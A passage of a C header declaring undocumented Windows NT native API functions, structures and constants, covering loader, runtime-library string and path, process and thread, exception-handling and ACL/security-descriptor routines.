LdrGetProcedureAddress(
    _In_ PVOID DllHandle,
    _In_opt_ CONST ANSI_STRING* ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddressForCaller(
    _In_ PVOID DllHandle,
    _In_opt_ PANSI_STRING ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress,
    _In_ ULONG Flags,
    _In_ PVOID *Callback);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetKnownDllSectionHandle(
    _In_ PCWSTR DllName,
    _In_ BOOLEAN KnownDlls32,
    _Out_ PHANDLE Section);

NTSYSAPI
NTSTATUS
NTAPI
LdrLoadDll(
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_  PCUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrUnloadDll(
    _In_ PVOID DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryProcessModuleInformation(
    _Out_ PRTL_PROCESS_MODULES ModuleInformation,
    _In_ ULONG ModuleInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
LdrRegisterDllNotification(
    _In_ ULONG Flags,
    _In_ PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    _In_opt_ PVOID Context,
    _Out_ PVOID *Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrUnregisterDllNotification(
    _In_ PVOID Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrResSearchResource(
    _In_ PVOID File,
    _In_ CONST ULONG_PTR* ResIds,
    _In_ ULONG ResIdCount,
    _In_ ULONG Flags,
    _Out_ LPVOID *Resource,
    _Out_ ULONG_PTR *Size,
    _In_opt_ USHORT *FoundLanguage,
    _In_opt_ ULONG *FoundLanguageLength);

NTSYSAPI
NTSTATUS
NTAPI
LdrOpenImageFileOptionsKey(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ BOOLEAN Wow64Path,
    _Out_ PHANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryImageFileExecutionOptions(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryImageFileExecutionOptionsEx(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize,
    _In_ BOOLEAN Wow64Path);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryImageFileKeyOption(
    _In_ HANDLE KeyHandle,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize);

NTSYSAPI
NTSTATUS
NTAPI
LdrDisableThreadCalloutsForDll(
    _In_ PVOID DllImageBase);

#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS           0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY                  0x00000002

#define LDR_LOCK_LOADER_LOCK_DISPOSITION_INVALID            0x00000000
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_ACQUIRED      0x00000001
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_NOT_ACQUIRED  0x00000002

#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS         0x00000001

NTSYSAPI
NTSTATUS
NTAPI
LdrLockLoaderLock(
    _In_ ULONG Flags,
    _Out_opt_ ULONG *Disposition,
    _Out_ PVOID *Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrUnlockLoaderLock(
    _In_ ULONG Flags,
    _Inout_ PVOID Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrRelocateImage(
    _In_ PVOID NewBase,
    _In_ PSTR LoaderName,
    _In_ NTSTATUS Success,
    _In_ NTSTATUS Conflict,
    _In_ NTSTATUS Invalid);

NTSYSAPI
PIMAGE_BASE_RELOCATION
NTAPI
LdrProcessRelocationBlock(
    _In_ ULONG_PTR VA,
    _In_ ULONG SizeOfBlock,
    _In_ PUSHORT NextOffset,
    _In_ LONG_PTR Diff);

NTSYSAPI
NTSTATUS
NTAPI
LdrShutdownProcess(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
LdrShutdownThread(
    VOID);

NTSYSAPI
BOOLEAN
NTAPI
LdrControlFlowGuardEnforced(
    VOID);

/*
**  LDR END
*/

typedef struct _HANDLEENTRY {
    PHEAD   phead;  // Pointer to the Object.
    PVOID   pOwner; // PTI or PPI
    BYTE    bType;  // Object handle type
    BYTE    bFlags; // Flags
    WORD    wUniq;  // Access count.
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
    WORD            wRIPFlags;
    WORD            wSRVIFlags;
    WORD            wRIPPID;
    WORD            wRIPError;
    ULONG           cHandleEntries;
    // incomplete
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
    PSERVERINFO		psi;
    PHANDLEENTRY	aheList;
    ULONG			HeEntrySize;
    // incomplete
} SHAREDINFO, *PSHAREDINFO;

typedef struct _USERCONNECT {
    ULONG ulVersion;
    ULONG ulCurrentVersion;
    DWORD dwDispatchCount;
    SHAREDINFO siClient;
} USERCONNECT, *PUSERCONNECT;

/*
** Runtime Library API START
*/

/************************************************************************************
*
* CSR API.
*
************************************************************************************/

NTSYSAPI
ULONG
NTAPI
CsrGetProcessId(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
CsrClientConnectToServer(
    _In_ PWSTR ObjectDirectory,
    _In_ ULONG ServerDllIndex,
    _Inout_ PVOID ConnectionInformation,
    _Inout_ ULONG *ConnectionInformationLength,
    _Out_ PBOOLEAN CalledFromServer);

/************************************************************************************
*
* RTL Strings API.
*
************************************************************************************/

#ifndef RtlInitEmptyUnicodeString
#define RtlInitEmptyUnicodeString(_ucStr,_buf,_bufSize) \
    ((_ucStr)->Buffer = (_buf), \
     (_ucStr)->Length = 0, \
     (_ucStr)->MaximumLength = (USHORT)(_bufSize))
#endif

NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PCWSTR SourceString);

NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeStringFromAsciiz(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PSTR SourceString);

NTSYSAPI
VOID
NTAPI
RtlInitString(
    _Inout_ PSTRING DestinationString,
    _In_ PCSZ SourceString);

NTSYSAPI
VOID
NTAPI
RtlInitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitUnicodeStringEx(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PWSTR SourceString);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualUnicodeString(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN CaseInSensitive);

NTSYSAPI
NTSTATUS
NTAPI
RtlDuplicateUnicodeString(
    _In_ ULONG Flags,
    _In_ PUNICODE_STRING StringIn,
    _Out_ PUNICODE_STRING StringOut);

NTSYSAPI
WCHAR
NTAPI
RtlUpcaseUnicodeChar(
    _In_ WCHAR SourceCharacter);

NTSYSAPI
WCHAR
NTAPI
RtlDowncaseUnicodeChar(
    _In_ WCHAR SourceCharacter);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsNameInExpression(
    _In_ PUNICODE_STRING Expression,
    _In_ PUNICODE_STRING Name,
    _In_ BOOLEAN IgnoreCase,
    _In_opt_ PWCH UpcaseTable);

NTSYSAPI
NTSTATUS
NTAPI
RtlStringFromGUID(
    _In_ GUID *Guid,
    _Out_ PUNICODE_STRING GuidString);

NTSYSAPI
NTSTATUS
NTAPI
RtlGUIDFromString(
    _In_ PUNICODE_STRING GuidString,
    _Out_ GUID *Guid);

NTSYSAPI
BOOLEAN
NTAPI
RtlPrefixUnicodeString(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN CaseInSensitive);

NTSYSAPI
NTSTATUS
NTAPI
RtlExpandEnvironmentStrings(
    _In_opt_ PVOID Environment,
    _In_reads_(SrcLength) PWSTR Src,
    _In_ SIZE_T SrcLength,
    _Out_writes_opt_(DstLength) PWSTR Dst,
    _In_ SIZE_T DstLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlExpandEnvironmentStrings_U(
    _In_opt_ PVOID Environment,
    _In_ PCUNICODE_STRING Source,
    _Out_ PUNICODE_STRING Destination,
    _Out_opt_ PULONG ReturnedLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlFormatCurrentUserKeyPath(
    _Out_ PUNICODE_STRING CurrentUserKeyPath);

NTSYSAPI
VOID
NTAPI
RtlFreeUnicodeString(
    _In_ PUNICODE_STRING UnicodeString);

NTSYSAPI
VOID
NTAPI
RtlEraseUnicodeString(
    _Inout_ PUNICODE_STRING String);

NTSYSAPI
VOID
NTAPI
RtlFreeAnsiString(
    _In_ PANSI_STRING AnsiString);

NTSYSAPI
NTSTATUS
NTAPI
RtlAnsiStringToUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PCANSI_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
WCHAR
NTAPI
RtlAnsiCharToUnicodeChar(
    _Inout_ PUCHAR *SourceCharacter);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToMultiByteSize(
    _Out_ PULONG BytesInMultiByteString,
    _In_reads_bytes_(BytesInUnicodeString) PWCH UnicodeString,
    _In_ ULONG BytesInUnicodeString);

NTSYSAPI
BOOLEAN
NTAPI
RtlDosPathNameToNtPathName_U(
    _In_ PCWSTR DosFileName,
    _Out_ PUNICODE_STRING NtFileName,
    _Out_opt_ PWSTR *FilePart,
    _Reserved_ PVOID Reserved);

NTSYSAPI
PWSTR
NTAPI
RtlIpv4AddressToStringW(
    _In_ const struct in_addr *Addr,
    _Out_ PWSTR S);

NTSYSAPI
LONG
NTAPI
RtlCompareUnicodeStrings(
    _In_reads_(String1Length) PWCHAR String1,
    _In_ SIZE_T String1Length,
    _In_reads_(String2Length) PWCHAR String2,
    _In_ SIZE_T String2Length,
    _In_ BOOLEAN CaseInSensitive);

NTSYSAPI
VOID
NTAPI
RtlCopyString(
    _In_ PSTRING DestinationString,
    _In_opt_ PSTRING SourceString);

NTSYSAPI
CHAR
NTAPI
RtlUpperChar(
    _In_ CHAR Character);

NTSYSAPI
VOID
NTAPI
RtlUpperString(
    _In_ PSTRING DestinationString,
    _In_ PSTRING SourceString);

//
// preallocated heap-growable buffers
//
typedef struct _RTL_BUFFER {
    PUCHAR    Buffer;
    PUCHAR    StaticBuffer;
    SIZE_T    Size;
    SIZE_T    StaticSize;
    SIZE_T    ReservedForAllocatedSize; // for future doubling
    PVOID     ReservedForIMalloc; // for future pluggable growth
} RTL_BUFFER, *PRTL_BUFFER;

typedef struct _RTL_UNICODE_STRING_BUFFER {
    UNICODE_STRING String;
    RTL_BUFFER     ByteBuffer;
    UCHAR          MinimumStaticBufferForTerminalNul[sizeof(WCHAR)];
} RTL_UNICODE_STRING_BUFFER, *PRTL_UNICODE_STRING_BUFFER;

//
// These are OUT Disposition values.
//
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_AMBIGUOUS   (0x00000001)
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_UNC         (0x00000002)
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_DRIVE       (0x00000003)
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_ALREADY_DOS (0x00000004)

NTSYSAPI
NTSTATUS
NTAPI
RtlNtPathNameToDosPathName(
    _In_ ULONG Flags,
    _Inout_ PRTL_UNICODE_STRING_BUFFER Path,
    _Out_opt_ PULONG Disposition,
    _Inout_opt_ PWSTR* FilePart);

NTSYSAPI
ULONG
NTAPI
RtlIsDosDeviceName_U(
    _In_ PCWSTR DosFileName);

NTSYSAPI
ULONG
NTAPI
RtlGetFullPathName_U(
    _In_ PCWSTR lpFileName,
    _In_ ULONG nBufferLength,
    _Out_writes_bytes_(nBufferLength) PWSTR lpBuffer,
    _Out_opt_ PWSTR *lpFilePart);

NTSYSAPI
BOOLEAN
NTAPI
RtlGetSearchPath(
    _Out_ PWSTR *SearchPath);

typedef enum _RTL_PATH_TYPE {
    RtlPathTypeUnknown,         // 0
    RtlPathTypeUncAbsolute,     // 1
    RtlPathTypeDriveAbsolute,   // 2
    RtlPathTypeDriveRelative,   // 3
    RtlPathTypeRooted,          // 4
    RtlPathTypeRelative,        // 5
    RtlPathTypeLocalDevice,     // 6
    RtlPathTypeRootLocalDevice  // 7
} RTL_PATH_TYPE;

NTSYSAPI
RTL_PATH_TYPE
NTAPI
RtlDetermineDosPathNameType_U(
    _In_ PCWSTR DosFileName);

#define HASH_STRING_ALGORITHM_DEFAULT   (0)
#define HASH_STRING_ALGORITHM_X65599    (1)
#define HASH_STRING_ALGORITHM_INVALID   (0xffffffff)

NTSYSAPI
NTSTATUS
NTAPI
RtlHashUnicodeString(
    _In_ const UNICODE_STRING *String,
    _In_ BOOLEAN CaseInSensitive,
    _In_ ULONG HashAlgorithm,
    _Out_ PULONG HashValue);

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeStringToString(
    _In_ PUNICODE_STRING Destination,
    _In_ PUNICODE_STRING Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeToString(
    _In_ PUNICODE_STRING Destination,
    _In_opt_ PWSTR Source);

NTSYSAPI
VOID
NTAPI
RtlCopyUnicodeString(
    _In_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeString(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlDowncaseUnicodeString(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
VOID
NTAPI
RtlEraseUnicodeString(
    _Inout_ PUNICODE_STRING String);

#define RTL_ENSURE_BUFFER_SIZE_NO_COPY (0x00000001)

NTSYSAPI
NTSTATUS
NTAPI
RtlpEnsureBufferSize(
    _In_ ULONG Flags,
    _Inout_ PRTL_BUFFER Buffer,
    _In_ SIZE_T NewSizeBytes);

#define RtlInitBuffer(Buff, StatBuff, StatSize) \
    do {                                        \
        (Buff)->Buffer       = (StatBuff);      \
        (Buff)->Size         = (StatSize);      \
        (Buff)->StaticBuffer = (StatBuff);      \
        (Buff)->StaticSize   = (StatSize);      \
    } while (0)

#define RtlEnsureBufferSize(Flags, Buff, NewSizeBytes) \
    (   ((Buff) != NULL && (NewSizeBytes) <= (Buff)->Size) \
        ? STATUS_SUCCESS \
        : RtlpEnsureBufferSize((Flags), (Buff), (NewSizeBytes)) \
    )

#define RtlFreeBuffer(Buff)                              \
    do {                                                 \
        if ((Buff) != NULL && (Buff)->Buffer != NULL) {  \
            if (RTLP_BUFFER_IS_HEAP_ALLOCATED(Buff)) {   \
                UNICODE_STRING UnicodeString;            \
                UnicodeString.Buffer = (PWSTR)(PVOID)(Buff)->Buffer; \
                RtlFreeUnicodeString(&UnicodeString);    \
            }                                            \
            (Buff)->Buffer = (Buff)->StaticBuffer;       \
            (Buff)->Size = (Buff)->StaticSize;           \
        }                                                \
    } while (0)

/************************************************************************************
*
* RTL Process/Thread API.
*
************************************************************************************/

typedef NTSTATUS(*PUSER_PROCESS_START_ROUTINE)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

typedef NTSTATUS(*PUSER_THREAD_START_ROUTINE)(
    PVOID ThreadParameter
    );

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE Process;
    HANDLE Thread;
    CLIENT_ID ClientId;
    SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

//
// This structure is used only by Wow64 processes. The offsets
// of structure elements should the same as viewed by a native Win64 application.
//
typedef struct _RTL_USER_PROCESS_INFORMATION64 {
    ULONG Length;
    LONGLONG Process;
    LONGLONG Thread;
    CLIENT_ID64 ClientId;
    SECTION_IMAGE_INFORMATION64 ImageInformation;
} RTL_USER_PROCESS_INFORMATION64, *PRTL_USER_PROCESS_INFORMATION64;

NTSYSAPI
NTSTATUS
STDAPIVCALLTYPE
RtlSetProcessIsCritical(
    _In_ BOOLEAN NewValue,
    _Out_opt_ PBOOLEAN OldValue,
    _In_ BOOLEAN CheckFlag);

NTSYSAPI
NTSTATUS
STDAPIVCALLTYPE
RtlSetThreadIsCritical(
    _In_ BOOLEAN NewValue,
    _Out_opt_ PBOOLEAN OldValue,
    _In_ BOOLEAN CheckFlag);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateEnvironment(
    _In_ BOOLEAN CloneCurrentEnvironment,
    _Out_ PVOID *Environment);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateEnvironmentEx(
    _In_ PVOID SourceEnv,
    _Out_ PVOID *Environment,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetCurrentEnvironment(
    _In_ PVOID Environment,
    _Out_opt_ PVOID *PreviousEnvironment);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryEnvironmentVariable_U(
    _In_opt_ PVOID Environment,
    _In_ PUNICODE_STRING Name,
    _Out_ PUNICODE_STRING Value);

NTSYSAPI
NTSTATUS
NTAPI
RtlDestroyEnvironment(
    _In_ PVOID Environment);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParameters(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData);

NTSYSAPI
NTSTATUS
NTAPI
RtlDestroyProcessParameters(
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateUserProcess(
    _In_ PUNICODE_STRING NtImagePathName,
    _In_ ULONG Attributes,
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    _In_opt_ PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    _In_opt_ HANDLE ParentProcess,
    _In_ BOOLEAN InheritHandles,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _Out_ PRTL_USER_PROCESS_INFORMATION ProcessInformationn);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateUserThread(
    _In_ HANDLE Process,
    _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    _In_ BOOLEAN CreateSuspended,
    _In_ ULONG StackZeroBits,
    _In_opt_ SIZE_T MaximumStackSize,
    _In_opt_ SIZE_T InitialStackSize,
    _In_ PUSER_THREAD_START_ROUTINE StartAddress,
    _In_opt_ PVOID Parameter,
    _Out_opt_ PHANDLE Thread,
    _Out_opt_ PCLIENT_ID ClientId);

NTSYSAPI
VOID
NTAPI
RtlExitUserThread(
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
VOID
NTAPI
RtlExitUserProcess(
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
VOID
NTAPI
RtlFreeUserThreadStack(
    _In_ HANDLE hProcess,
    _In_ HANDLE hThread);

NTSYSAPI
VOID
NTAPI
RtlPushFrame(
    _In_ PTEB_ACTIVE_FRAME Frame);

NTSYSAPI
VOID
NTAPI
RtlPopFrame(
    _In_ PTEB_ACTIVE_FRAME Frame);

NTSYSAPI
PTEB_ACTIVE_FRAME
NTAPI
RtlGetFrame(
    VOID);

NTSYSAPI
PVOID
NTAPI
RtlEncodePointer(
    _In_ PVOID Ptr);

NTSYSAPI
PVOID
NTAPI
RtlDecodePointer(
    _In_ PVOID Ptr);

/************************************************************************************
*
* RTL Memory Buffer API.
*
************************************************************************************/

NTSYSAPI
SIZE_T
NTAPI
RtlCompareMemoryUlong(
    _In_ PVOID Source,
    _In_ SIZE_T Length,
    _In_ ULONG Pattern);

NTSYSAPI
VOID
NTAPI
RtlFillMemoryUlong(
    _Out_ PVOID Destination,
    _In_ SIZE_T Length,
    _In_ ULONG Pattern);

NTSYSAPI
VOID
NTAPI
RtlFillMemoryUlonglong(
    _Out_ PVOID Destination,
    _In_ SIZE_T Length,
    _In_ ULONGLONG Pattern);

/************************************************************************************
*
* RTL PEB API.
*
************************************************************************************/

NTSYSAPI
PPEB
NTAPI
RtlGetCurrentPeb(
    VOID);

NTSYSAPI
VOID
NTAPI
RtlAcquirePebLock(
    VOID);

NTSYSAPI
VOID
NTAPI
RtlReleasePebLock(
    VOID);

/************************************************************************************
*
* RTL Exception Handling API.
*
************************************************************************************/

NTSYSAPI
PVOID
NTAPI
RtlAddVectoredExceptionHandler(
    _In_ ULONG First,
    _In_ PVECTORED_EXCEPTION_HANDLER Handler);

NTSYSAPI
ULONG
NTAPI
RtlRemoveVectoredExceptionHandler(
    _In_ PVOID Handle);

NTSYSAPI
BOOLEAN
NTAPI
RtlDispatchException(
    _In_ PEXCEPTION_RECORD ExceptionRecord,
    _In_ PCONTEXT ContextRecord);

NTSYSAPI
PVOID
NTAPI
RtlAddVectoredContinueHandler(
    _In_ ULONG First,
    _In_ PVECTORED_EXCEPTION_HANDLER Handler);

NTSYSAPI
ULONG
NTAPI
RtlRemoveVectoredContinueHandler(
    _In_ PVOID Handle);

NTSYSAPI
VOID
NTAPI
RtlRaiseException(
    _In_ PEXCEPTION_RECORD ExceptionRecord);

NTSYSAPI
DECLSPEC_NORETURN
VOID
NTAPI
RtlRaiseStatus(
    _In_ NTSTATUS Status);

NTSYSAPI
NTSTATUS
NTAPI
NtContinue(
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN TestAlert);

NTSYSAPI
NTSTATUS
NTAPI
NtRaiseException(
    _In_ PEXCEPTION_RECORD ExceptionRecord,
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN FirstChance);

/************************************************************************************
*
* RTL Security API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlGetOwnerSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PSID *Owner,
    _Out_ PBOOLEAN OwnerDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetGroupSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PSID *Group,
    _Out_ PBOOLEAN GroupDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetDaclSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PBOOLEAN DaclPresent,
    _Out_ PACL *Dacl,
    _Out_ PBOOLEAN DaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetSaclSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PBOOLEAN SaclPresent,
    _Out_ PACL *Sacl,
    _Out_ PBOOLEAN SaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateAcl(
    _Out_writes_bytes_(AclLength) PACL Acl,
    _In_ ULONG AclLength,
    _In_ ULONG AclRevision);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidAcl(
    _In_ PACL Acl);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryInformationAcl(
    _In_ PACL Acl,
    _Out_writes_bytes_(AclInformationLength) PVOID AclInformation,
    _In_ ULONG AclInformationLength,
    _In_ ACL_INFORMATION_CLASS AclInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetInformationAcl(
    _Inout_ PACL Acl,
    _In_reads_bytes_(AclInformationLength) PVOID AclInformation,
    _In_ ULONG AclInformationLength,
    _In_ ACL_INFORMATION_CLASS AclInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG StartingAceIndex,
    _In_reads_bytes_(AceListLength) PVOID AceList,
    _In_ ULONG AceListLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceIndex);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetAce(
    _In_ PACL Acl,
    _In_ ULONG AceIndex,
    _Outptr_ PVOID *Ace);

NTSYSAPI
BOOLEAN
NTAPI
RtlFirstFreeAce(
    _In_ PACL Acl,
    _Out_ PVOID *FirstFree);

NTSYSAPI
BOOLEAN
NTAPI
RtlOwnerAcesPresent(
    _In_ PACL pAcl);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessDeniedAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessDeniedAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAuditAccessAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAuditAccessAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessDeniedObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAuditAccessObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddCompoundAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID ServerSid,
    _In_ PSID ClientSid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddMandatoryAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ PSID Sid,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask);

NTSYSAPI
NTSTATUS
NTAPI
RtlDefaultNpAcl(
    _Out_ PACL *Acl);

NTSYSAPI
ULONG
NTAPI
RtlLengthSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSAPI
VOID
NTAPI
RtlMapGenericMask(
